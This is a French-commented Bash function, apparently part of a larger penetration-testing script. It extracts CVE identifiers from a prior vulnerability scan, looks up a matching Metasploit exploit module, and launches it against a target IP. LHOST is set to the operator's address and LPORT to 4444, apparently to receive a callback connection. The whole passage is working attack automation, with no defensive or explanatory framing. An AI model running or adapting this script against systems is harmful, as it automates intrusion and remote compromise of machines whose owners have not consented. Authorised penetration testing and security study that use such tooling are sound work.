                                           #### 5 - Exploitation des vulnérabilités ####


exploitation_metasploit() {
    echo -e "${bleu}#### Exploitation des vulnérabilités ####${reset}"
    
#analyse les vulnérabilités et propose des attaques
    vuln_options=()
    if [[ $vuln_scan =~ "CVE" ]]; then
        echo "Vulnérabilités trouvées :"
        vuln_lines=$(echo "$vuln_scan" | grep "CVE")
        while read -r line; do
            vuln_options+=("$line")
        done <<< "$vuln_lines"
    else
        echo "Aucune vulnérabilité exploitable trouvée."
        return  
    fi

    echo "Choisissez une vulnérabilité à exploiter :"
    select vuln_choice in "${vuln_options[@]}"; do
        if [[ -n $vuln_choice ]]; then
            echo "Vous avez choisi : $vuln_choice"
            break
        else
            echo "Choix invalide. Veuillez réessayer."
        fi
    done

    cve=$(echo "$vuln_choice" | grep -oP 'CVE-\d{4}-\d+')

    echo -e "${jaune}Recherche du module Metasploit pour la vulnérabilité $cve...${reset}"

    modules=$(msfconsole -q -x "search $cve; exit" | grep exploit | awk '{print $1}')

    if [[ -z $modules ]]; then
        echo "Aucun module Metasploit trouvé pour le CVE $cve."
        return 
    fi

    echo "Modules Metasploit trouvés pour $cve :"
    echo "$modules"

    echo "Choisissez un module à utiliser :"
    select module_choice in $modules; do
        if [[ -n $module_choice ]]; then
            echo "Vous avez choisi : $module_choice"
            break
        else
            echo "Choix invalide. Veuillez réessayer."
        fi
    done

    echo -e "${jaune}Lancement de Metasploit pour exploiter la vulnérabilité $cve avec le module $module_choice...${reset}"

    msfconsole -q -x "
use $module_choice
set RHOSTS $ip_cible
set LHOST <votre_IP>
set LPORT 4444
exploit
"

    echo -e "${vert}Exploit terminé.${reset}"
}
